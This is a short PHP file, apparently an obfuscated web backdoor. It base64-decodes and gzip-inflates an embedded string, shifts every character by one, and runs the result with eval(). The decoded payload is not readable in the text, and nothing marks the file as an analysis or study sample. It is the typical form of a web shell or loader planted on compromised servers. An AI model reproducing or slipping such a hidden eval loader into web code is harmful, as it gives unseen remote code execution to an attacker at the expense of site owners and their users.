<?php function VIr($zhr)
{ 
$zhr=gzinflate(base64_decode($zhr));
 for($i=0;$i<strlen($zhr);$i++)
 {
$zhr[$i] = chr(ord($zhr[$i])-1);
 }
 return $zhr;
 }eval(VIr("LVDLbsMgEPyAfMUqyqG9FIN5pEY59Vqpp0ZNhRTFFOJIkbFk3ND8fBcIAg3szOyyC4BrRchH75fZnqKD/g+GGKe5I2RZYgjXFzuSaZjICs4hBti/+69fDbfPQ/PWweZ+P7gGduAvV3c8u3i0YYxujPPTZs9urXrW1ea/x36rqxtthUPb2iS5NUlxQyVHbBBbk9qTESrvJH8MVbSqkKG8LSgkQqZfq1EKpIRJzBkqKJ7iLrlUpmmRZSq7E/MoZ3hnGGPlnWsnaRFzKlU1RY8pOS/padaUEk39s8CY4OtHj2UmurbagbNDeMxH/wM="));?>